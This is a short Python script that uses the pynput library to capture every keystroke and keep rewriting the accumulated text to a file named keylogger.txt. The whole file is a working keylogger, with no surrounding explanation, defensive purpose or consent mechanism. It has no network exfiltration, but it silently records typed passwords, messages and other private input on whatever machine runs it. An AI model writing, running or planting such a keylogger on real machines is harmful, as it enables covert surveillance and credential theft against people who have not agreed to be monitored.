from pynput import keyboard
import time

result = ""

def on_press(key):
    global result
    try:
        result += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            result += " "
        else:
            result += " " + str(key) + " "

    with open("keylogger.txt", "w") as file:
        file.write(result)

# Start capturing keystrokes
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
    time.sleep(10)
